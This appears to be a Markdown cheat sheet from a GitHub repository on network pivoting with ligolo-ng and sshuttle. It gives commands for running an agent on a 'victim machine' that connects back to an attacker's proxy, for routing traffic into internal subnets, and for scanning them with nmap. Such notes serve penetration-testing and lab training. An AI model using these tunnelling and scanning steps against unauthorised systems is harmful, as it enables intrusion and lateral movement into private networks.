# Pivoting

# Ligolo-ng
### Download link for ligolo-ng<br/>
Link: https://github.com/nicocha30/ligolo-ng<br/>

### Creating Interface
```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### PROXY - server needs to be run on attacker machine 
#### start the server
```sudo ./proxy -laddr 0.0.0.0:<port> -selfcert```

### Agent - agent needs to be run on victim machine
#### connect the agent to server
##### windows agent
```agent.exe -connect <LHOST>:lport -ignore-cert```
##### linux agent
```./agent -connect <LHOST>:lport -ignore-cert```

### List the sessions
```ligolo-ng » session ``` #list session<br/>
```[Agent : client@client-virtual-machine] » ifconfig``` #check different network interfaces that victim connected
```You will receive result something like below
   ┌───────────────────────────────────────────────┐
   │ Interface 4                                   │
   ├──────────────┬────────────────────────────────┤
   │ Name         │ ens37                          │
   │ Hardware MAC │ 00:0c:29:45:60:ff              │
   │ MTU          │ 1500                           │
   │ Flags        │ up|broadcast|multicast|running │
   │ IPv4 Address │ 10.10.10.148/24                │
   │ IPv6 Address │ fe80::f04d:685d:278c:9642/64   │
   └──────────────┴────────────────────────────────┘
```

### Now to pivot to above example network run
```sudo ip route add ip/24 dev ligolo``` #ip here with above example 10.10.10.148/24

### Finally start the tunnel
```[Agent : client@client-virtual-machine] » tunnel_start```

### Now you can access all the machines inside the above example network 10.10.10.148/24
```sudo nmap 10.10.10.0/24```
![image](https://github.com/bhanugoudm041/Pivoting/assets/92798414/a703906f-b7db-4a33-b3fd-0bfed798101e)


# Sshuttle<br/>
### Install sshuttle on kali or attacker machine<br/>
``` sudo apt install sshuttle```
### Start the tunnel<br/>
```sudo sshuttle -r targetuser@targermachineip targetpivotnetwork```  #example: sudo sshuttle -r client@192.168.1.20 10.10.10.0/24<br/>
### Now use curl or wget or browser to access pivoted network services<br/>
curl http://pivotnetworkmachineip:port/   #example: curl http://10.10.10.132:80/<br/>
![image](https://github.com/bhanugoudm041/Pivoting/assets/92798414/2d0da11f-063c-444b-a71c-17c8eec34ca9)
